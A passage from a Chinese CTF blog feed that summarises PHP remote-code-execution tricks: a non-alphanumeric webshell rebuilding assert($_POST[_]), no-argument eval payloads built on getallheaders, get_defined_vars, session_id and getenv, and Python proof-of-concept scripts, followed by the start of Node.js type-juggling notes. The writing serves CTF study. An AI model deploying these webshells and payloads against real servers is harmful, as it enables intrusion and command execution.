&#39;b&#39;</code>，<code>&#39;b&#39;++ =&gt; &#39;c&#39;</code>… 所以，我们只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得a-z中所有字符。</p><p>那么，如何拿到一个值为字符串’a’的变量呢？</p><p>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code>：</p><p><a href="https://www.leavesongs.com/media/attachment/2017/02/17/4d0c6bc9-5417-41b2-91ca-4e110e8d1350.jpg"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/4d0c6bc9-5417-41b2-91ca-4e110e8d1350.72f524026162.jpg" alt="14872697183159.jpg"></a></p><p>再取这个字符串的第一个字母，就可以获得’A’了。</p><p>利用这个技巧，我编写了如下webshell（因为PHP函数是大小写不敏感的，所以我们最终执行的是<code>ASSERT($_POST[_])</code>，无需获取小写a）：</p><pre><code class="php">&lt;?php$_=[];$_=@&quot;$_&quot;; // $_=&#39;Array&#39;;$_=$_[&#39;!&#39;==&#39;@&#39;]; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]);</code></pre><p>可直接传入</p><pre><code class="php">//测试发现7.0.12以上版本不可使用//使用时需要url编码下$_=[];$_=@&quot;$_&quot;;$_=$_[&#39;!&#39;==&#39;@&#39;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);固定格式 构造出来的 assert($_POST[_]);url编码后再使用%24_%3d%5b%5d%3b%24_%3d%40%22%24_%22%3b%24_%3d%24_%5b&#39;!&#39;%3d%3d&#39;%40&#39;%5d%3b%24___%3d%24_%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24____%3d&#39;_&#39;%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24_%3d%24%24____%3b%24___(%24_%5b_%5d)%3b然后post传入   _=phpinfo();</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121210330927.png" alt="image-20221121210330927"></p><h1 id="无参数rce"><a href="#无参数rce" class="headerlink" title="无参数rce"></a>无参数rce</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>无参数RCE，其实就是通过<strong>没有参数的函数</strong>达到命令执行的目的。<br> <strong>没有参数的函数</strong>什么意思？一般该类题目代码如下(或类似)：</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);header(&quot;Content-Type: text/html; charset=utf-8&quot;);if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;    eval($_GET[&#39;code&#39;]);&#125;</code></pre><p>先来解读下代码：</p><pre><code>如果&#39;;&#39;===preg_replace(...)，那么就执行exp传递的命令\ : 转义字符不多说了[a-z,_]+ : [a-z,_]匹配小写字母和下划线 +表示1到多个(?R)? : (?R)代表当前表达式，就是这个(/[a-z,_]+((?R)?)/)，所以会一直递归，?表示递归当前表达式0次或1次（若是(?R)*则表示递归当前表达式0次或多次，例如它可以匹配a(b(c()d()))）</code></pre><p>简单说来就是：这串代码检查了我们通过GET方式传入的exp参数的值，如果传进去的值是传进去的值是字符串接一个()，那么字符串就会被替换为空。如果（递归）替换后的字符串只剩下;,那么我们传进去的 exp 就会被 eval 执行。比如我们传入一个 phpinfo();，它被替换后就只剩下;，那么根据判断条件就会执行phpinfo();。</p><p>(?R)?能匹配的只有a(); a(b()); a(b(c()));这种类型的。比如传入a(b(c()));，第一次匹配后，就剩a(b());，第二次匹配后，a();，第三次匹配后就只剩下;了，最后a(b(c()));就会被eval执行。</p><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><p>先来整理下经常需要用到的函数吧，后面会说具体使用:</p><pre><code class="php">目录操作:getchwd() //函数返回当前工作目录。scandir() //函数返回指定目录中的文件和目录的数组。dirname() //函数返回路径中的目录部分。chdir() //函数改变当前的目录。数组操作:pos()     //current() 的别名reset()  //将数组的内部指针指向第一个单元end()     //将内部指针指向数组中的最后一个元素，并输出。next() //函数将内部指针指向数组中的下一个元素，并输出。prev()  //将数组内部指针倒回一位。each()  //返回当前元素的键名和键值，并将内部指针向前移动array_reverse()以相反的元素顺序返回数组。array_rand() 函数返回数组中的随机键名(也就是下标)，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。array_flip() array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。array_slice() 函数在数组中根据条件取出一段值，并返回。    读取文件操作:readfile() //输出一个文件。readgzfile()show_source()highlight_file()   //打印输出或者返回 filename 文件中语法高亮版本的代码。file_get_contents ()    其它函数:localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.current() 返回数组中的当前单元, 默认取第一个值。current(localeconv())永远都是个点chr() 函数从指定的 ASCII 值返回字符。hex2bin() — 转换十六进制字符串为二进制字符串。getenv() 获取一个环境变量的值(在7.1之后可以不给予参数)。localeconv() 函数返回一包含本地数字及货币格式信息的数组。    phpversion()返回php版本，如7.3.5floor(phpversion())返回7sqrt(floor(phpversion()))返回2.6457513110646tan(floor(sqrt(floor(phpversion()))))返回-2.1850398632615cosh(tan(floor(sqrt(floor(phpversion())))))返回4.5017381103491sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))返回45.081318677156ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))返回46chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))返回.var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))扫描当前目录next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))返回..//floor()：舍去法取整，sqrt()：平方根，tan()：正切值，cosh()：双曲余弦，sinh()：双曲正弦，ceil()：进一法取整    chr(ord(hebrevc(crypt(phpversion()))))`返回`.  //hebrevc(crypt(arg))可以随机生成一个hash值 第一个字符随机是 $(大概率) 或者 .(小概率) 然后通过ord chr只取第一个字符//crypt()：单向字符串散列，返回散列后的字符串或一个少于 13 字符的字符串，从而保证在失败时与盐值区分开来。//hebrevc()：将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew），并且转换换行符，返回视觉顺序字符串。</code></pre><h2 id="dirname-amp-chdir"><a href="#dirname-amp-chdir" class="headerlink" title="dirname() &amp; chdir()"></a>dirname() &amp; chdir()</h2><p>这个方法并不可以rce，只是可以完成读取文件的操作，事实上在很多情况下已经够用了</p><p>想读文件，就必须进行目录遍历，没有参数，怎么进行目录遍历呢？<br>首先，我们可以利用<code>getcwd()</code>获取当前目录</p><pre><code class="php">var_dump(getcwd());</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122174021764.png" alt="image-20221122174021764"></p><p>那么怎么进行当前目录的目录遍历呢？<br>这里用<code>scandir()</code>即可</p><pre><code class="php">var_dump(scandir(getcwd()));</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122174107093.png" alt="image-20221122174107093"></p><p>如果getcwd()无法使用呢?</p><p>我们知道localeconv()返回一包含本地数字及货币格式信息的数组。而数组第一项就是<code>.</code></p><p>我们可构造出:</p><pre><code class="php">var_dump(scandir(current(localeconv())));  //var_dump也可以用print_r代替var_dump(scandir(pos(localeconv())));var_dump(scandir(reset(localeconv())));var_dump(scandir(chr(current(localtime(time()))))); //chr()函数以256为一个周期，所以chr(46),chr(302),chr(558)都等于&quot;.&quot;所以使用chr(time())，一个周期必定出现一次&quot;.&quot; 我爆破了1w次，雀氏有可行性哈哈，不过雀氏有点小离谱var_dump(scandir(chr(ord(hebrevc(crypt(time())))))); //hebrevc(crypt(arg))可以随机生成一个hash值，第一个字符随机是$(大概率) 或者 &quot;.&quot;(小概率) 然后通过chr(ord())只取第一个字符var_dump(scandir(chr(ord(strrev(crypt(serialize(array())))))));  if(chdir(chr(ord(strrev(crypt(serialize(array())))))))print_r(scandir(getcwd())); //设置当前工作路径为根目录，然后遍历此目录</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122175238708.png" alt="  "></p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122175828251.png" alt="image-20221122175828251"></p><p>如何进行目录上跳呢？我们用<code>dirname()</code>即可</p><pre><code class="php">var_dump(scandir(dirname(getcwd())));</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122174205898.png" alt="image-20221122174205898"></p><p>那么怎么更改我们的当前目录呢？使用<code>chdir</code></p><pre><code>chdir(dirname(getcwd()));  //将当前目录设置为上一级目录</code></pre><p>搭配chadir来读取文件:</p><pre><code class="php">readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</code></pre><p>再给出其它一些读取文件的操作:</p><pre><code class="php">当前目录：highlight_file(array_rand(array_flip(scandir(getcwd()))));上级目录文件：highlight_file(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));以上两个都是随机获取的其实，看脸,它们的作用都是随机选取一个根目录的文件进行读取</code></pre><h2 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders"></a>getallheaders</h2><p>只适用于apache中间件</p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122143753491.png" alt="image-20221122143753491" style="zoom:67%;"><p>我们来打印出来看看</p><pre><code>http://127.0.0.1/index.php?code=var_dump(getallheaders());</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122144238099.png" alt="image-20221122144238099"></p><p>它把我们的header头输出了，但是header头我们是可以自定义的</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122144525537.png" alt="image-20221122144525537"></p><p><code>getallheaders()</code>返回所有的HTTP头信息，但是要注意的一点是这个函数返回的是一个数组，而eval()要求的参数是一个字符串，所以这里不能直接用，这时我们就要想办法将数组转换为字符串。正好<code>implode()</code>这个函数就能胜任。</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122144718307.png" alt="image-20221122144718307"></p><p>我们来使用一下，可以看到获取到的头信息被当作字符串输出了，且是从最后开始输出(由于php版本不同，输出顺序也可能不同)，那么我们就可以在最后随意添加一个头，插入我们的恶意代码并将后面的内容注释掉。</p><pre><code class="php">var_dump(implode(getallheaders()));sakura: flag</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122144928146.png" alt="image-20221122144928146"></p><p>来执行命令:</p><pre><code class="php">GET /index.php?code=eval(implode(getallheaders())); HTTP/1.1sakura: system(whoami);//</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122145432187.png" alt="image-20221122145432187"></p><p>事实上这样操作具有局限性，万一我们输出的头不再最开始不就g了?</p><p>但是我们有很多函数可以去帮我们去获得我们想要的字符串</p><p>由于在开头第一个我们还可以使用pos函数去得到我们输入的命令</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122150157102.png" alt="image-20221122150157102"></p><p>假如说它的位置不在数组第一个，在最后一个呢?</p><p>我们只需要使用end就可以把它取出来，这里我输入的值位置并不在第一个，所以取出来并没有用，只是做个示范罢了</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122150850290.png" alt="image-20221122150850290"></p><p>那么相信大家已经会了，现在我们如何取数组第二个呢?</p><p>相信大家心里已经有了答案，使用next!</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122151030098.png" alt="image-20221122151030098"></p><p>就是这样，搭配不同的函数取出我们想要的值即可</p><h2 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h2><p>使用getallheaders()其实具有局限性，因为他是apache的函数，如果目标中间件不为apache，那么这种方法就会失效，我们也没有更加普遍的方式呢？这里我们可以使用get_defined_vars()</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122154832676.png" alt="image-20221122154832676"></p><p>该函数的作用是获取所有的已定义变量，返回值也是数组。不过这个函数返回的是一个二维数组，所以不能与<code>implode</code>结合起来用。将<code>get_defined_vars()</code>的结果用<code>var_dump()</code>输出结果如下：</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122155240401.png" alt="image-20221122155240401"></p><p>发现其可以回显全局变量:</p><pre><code>$_GET$_POST$_FILES$_COOKIE</code></pre><p>可以看到用GET传入的参数会被显示在数组中的第一位,不过这里有这么多的数组，我们也不需要全部查看,只需要使用<code>current()</code>函数就可以取到我们想要的东西</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122155556428.png" alt="image-20221122155556428"></p><p>我们来试一试:</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122155713268.png" alt="image-20221122155713268"></p><p>给我们返回了一个一维数组，我们再想办法取得第二个值:</p><pre><code class="php">GET /index.php?code=var_dump(next(current(get_defined_vars())));&amp;sakura=system(whoami); HTTP/1.1</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122155831177.png" alt="image-20221122155831177"></p><p>然后就可以来执行命令</p><pre><code class="php">GET /index.php?code=eval(next(current(get_defined_vars())));&amp;sakura=system(whoami); HTTP/1.1</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122161512219.png" alt="image-20221122161512219"></p><p>除了next还可以使用end</p><pre><code class="php">GET /index.php?code=eval(end(current(get_defined_vars())));&amp;sakura=system(whoami); HTTP/1.1</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122161858843.png" alt="image-20221122161858843"></p><p>但一般网站喜欢对</p><pre><code>$_GET$_POST$_COOKIE</code></pre><p>做全局过滤，所以我们可以尝试从<code>$_FILES</code>下手，这就需要我们自己写一个上传</p><pre><code class="python">import requestsfrom io import BytesIOpayload = &quot;system(&#39;ls /tmp&#39;);&quot;.encode(&#39;hex&#39;)files = &#123;  payload: BytesIO(&#39;sky cool!&#39;)&#125;r = requests.post(&#39;http://localhost/skyskysky.php?code=eval(hex2bin(array_rand(end(get_defined_vars()))));&#39;, files=files, allow_redirects=False)print r.content</code></pre><p>注意:上面这个脚本只适用于$_FILES在最后的情况，要根据条件不用去修改其位置</p><h2 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a>session_id()</h2><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122164305081.png" alt="image-20221122164305081"></p><p>官方说：<code>session_id()</code>可以用来获取/设置当前会话 ID。<br> 那么可以用这个函数来获取cookie中的<code>phpsessionid</code>了，并且这个值我们是可控的。<br> 但其有限制：</p><p><strong>文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - （减号）</strong></p><p>解决方法：将参数转化为16进制传进去，之后再用hex2bin()函数转换回来就可以了。</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122164407079.png" alt="image-20221122164407079"></p><p>但session_id必须要开启session才可以使用，所以我们要先使用session_start。</p><p>所以，payload可以为：</p><pre><code class="php">eval(hex2bin(session_id(session_start())));  //hex(&quot;phpinfo();&quot;)=706870696e666f28293b</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122164738128.png" alt="image-20221122164738128"></p><p>顺便给出一个poc:</p><pre><code class="python">import requestsurl = &#39;http://localhost/?code=eval(hex2bin(session_id(session_start())));&#39;payload = &quot;echo &#39;sky cool&#39;;&quot;.encode(&#39;hex&#39;)cookies = &#123;    &#39;PHPSESSID&#39;:payload&#125;r = requests.get(url=url,cookies=cookies)print r.content</code></pre><h2 id="getenv"><a href="#getenv" class="headerlink" title="getenv"></a>getenv</h2><p><strong>只适用于php7.1以后版本</strong></p><p>通过array_rand()和array_flip()结合去取我们想要的那个值，但是一般情况下php.ini中，variables_order值为：GPCS，即没有定义Environment(E)变量，无法利用。只有当其配置为EGPCS时才可利用。</p><p>查阅php手册，有非常多的超全局变量</p><pre><code class="php">$GLOBALS$_SERVER$_GET$_POST$_FILES$_COOKIE$_SESSION$_REQUEST$_ENV</code></pre><p>我们可以使用<code>$_ENV</code>，对应函数为<code>getenv()</code></p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122165153813.png" alt="image-20221122165153813"></p><p>我们来打印一下吧:</p><pre><code class="php">GET /index.php?code=var_dump(getenv()); HTTP/1.1</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122170631213.png" alt="image-20221122170631213"></p><p>虽然<code>getenv()</code>可获取当前环境变量，但我们怎么从一个偌大的数组中取出我们指定的值成了问题<br>这里可以使用方法：</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/2019-03-29-13-47-19.png" alt="img"></p><p>我们来试一下:</p><pre><code class="php">GET /index.php?code=var_dump(array_rand(getenv())); </code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122170911592.png" alt="image-20221122170911592"></p><p>但是我们不想要下标，我们想要下标的值，该怎么办呢?</p><pre><code class="php">GET /index.php?code=var_dump(array_rand(array_flip(getenv()))); HTTP/1.1</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122171114135.png" alt="image-20221122171114135"></p><p>我们这么写达到了什么效果呢?—&gt;随机获取一个环境变量的值</p><p>我们则可用爆破的方式获取数组中任意位置需要的值，那么即可使用getenv()，并获取指定位置的恶意参数</p><p>说实话我个人对这种做法还是比较懵逼，我并没有找到好的方法去执行命令，我观看了网上的文章都是到这一步就停下了，唯一达到的效果就是执行了phpinfo()?其实也不必要这么麻烦的</p><pre><code class="php">POST /index.php?code=var_dump(getenv(phpinfo())); HTTP/1.1</code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p><p><a href="https://blog.csdn.net/qq_41315957/article/details/118855865">https://blog.csdn.net/qq_41315957/article/details/118855865</a></p><p><a href="https://blog.csdn.net/Manuffer/article/details/120738755">https://blog.csdn.net/Manuffer/article/details/120738755</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近准备把所学的漏洞全部仔细的整理一遍，一、是为了让自己对这些知识点有些全面系统的认识 二、是写题的时候可以直接翻</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="常见漏洞和手法" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/"/>
    
    
    <category term="rce" scheme="https://sakurahack-y.github.io/tags/rce/"/>
    
  </entry>
  
  <entry>
    <title>Nodejs漏洞总结</title>
    <link href="https://sakurahack-y.github.io/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>https://sakurahack-y.github.io/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2022-11-20T06:32:10.000Z</published>
    <updated>2022-11-20T10:03:47.668Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Nodejs语言特性"><a href="#Nodejs语言特性" class="headerlink" title="Nodejs语言特性"></a>Nodejs语言特性</h1><h2 id="大小写特性"><a href="#大小写特性" class="headerlink" title="大小写特性"></a>大小写特性</h2><pre><code class="plsql">toUpperCase()toLowerCase()</code></pre><p> 对于toUpperCase(): 字符”ı”、”ſ” 经过toUpperCase处理后结果为 “I”、”S”<br>对于toLowerCase(): 字符”K”经过toLowerCase处理后结果为”k”(这个K不是K)  </p><h2 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h2><h3 id="大小比较"><a href="#大小比较" class="headerlink" title="大小比较"></a>大小比较</h3><pre><code class="plsql">console.log(1==&#39;1&#39;); //true console.log(1&gt;&#39;2&#39;); //false console.log(&#39;1&#39;&lt;&#39;2&#39;); //true console.log(111&gt;&#39;3&#39;); //true console.log(&#39;111&#39;&gt;&#39;3&#39;); //false console.log(&#39;asd&#39;&gt;1); //false</code></pre><p> 总结：数字与字符串比较时，会优先将纯数字型字符串转为数字之后再进行比较；而字符串与字符串比较时，会将字符串的第一个字符转为ASCII码之后再进行比较，因此就会出现第五行代码的这种情况；而非数字型字符串与任何数字进行比较都是false  </p><h3 id="数组比较"><a href="#数组比较" class="headerlink" title="数组比较"></a>数组比较</h3><pre><code class="plsql">console.log([]==[]); //false console.log([]&gt;[]); //falseconsole.log([6,2]&gt;[5]); //true console.log([100,2]&lt;&#39;test&#39;); //true console.log([1,2]&lt;&#39;2&#39;);  //true console.log([11,16]&lt;&quot;10&quot;); //false</code></pre><p> 总结：空数组之间比较永远为false，数组之间比较只比较数组间的第一个值，对第一个值采用前面总结的比较方法，数组与非数值型字符串比较，数组永远小于非数值型字符串；数组与数值型字符串比较，取第一个之后按前面总结的方法进行比较  </p><h3 id="还有一些比较特别的相等："><a href="#还有一些比较特别的相等：" class="headerlink" title="还有一些比较特别的相等："></a>还有一些比较特别的相等：</h3><pre><code class="plsql">console.log(null==undefined) // 输出：true console.log(null===undefined) // 输出：false console.log(NaN==NaN)  // 输出：false console.log(NaN===NaN)  // 输出：false</code></pre><h2 id="变量拼接："><a href="#变量拼接：" class="headerlink" title="变量拼接："></a>变量拼接：</h2><pre><code class="plsql">console.log(5+[6,6]); //56,6console.log(&quot;5&quot;+6); //56 console.log(&quot;5&quot;+[6,6]); //56,6 console.log(&quot;5&quot;+[&quot;6&quot;,&quot;6&quot;]); //56,6</code></pre><h2 id="MD5的绕过"><a href="#MD5的绕过" class="headerlink" title="MD5的绕过"></a>MD5的绕过</h2><pre><code class="plsql">a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag)</code></pre><p>a[x]=1&amp;b[x]=2<br>数组会被解析成**[object Object]      **</p><pre><code class="plsql">a=&#123;&#39;x&#39;:&#39;1&#39;&#125;b=&#123;&#39;x&#39;:&#39;2&#39;&#125; console.log(a+&quot;flag&#123;xxx&#125;&quot;)console.log(b+&quot;flag&#123;xxx&#125;&quot;) a=[1]b=[2] console.log(a+&quot;flag&#123;xxx&#125;&quot;)console.log(b+&quot;flag&#123;xxx&#125;&quot;)</code></pre><p><img 